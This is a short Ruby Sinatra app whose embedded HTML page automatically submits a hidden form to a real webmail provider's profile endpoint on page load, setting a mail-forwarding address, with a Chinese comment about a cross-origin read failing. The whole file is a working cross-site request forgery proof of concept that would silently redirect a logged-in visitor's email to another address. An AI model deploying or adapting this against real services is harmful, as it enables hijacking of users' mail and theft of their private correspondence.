require 'sinatra'

get '/' do
  erb :index
end

__END__
@@index
<html>
<head></head>
<body onload='xx();'>
<form method='post' name='sohu' action='http://mail.sohu.net/bapp/20/profile' target='if'>
<input type='hidden' name='forward' value='1@2.com' />
<input type='hidden' name='_method' value='put' />
</form>
<iframe id='if' name='if'>
<script type='text/javascript'>
document.write(document.domain);
</script>
</iframe>
<script type='text/javascript'>
function xx() {
  console.log(document.domain);
  sohu.submit();
  setTimeout(function() {
    var i = document.getElementById('if').contentWindow;
    console.log(i.domain);// 报错，没有权限，跨域了
  }, 1000);
}
</script>

</body>
</html>

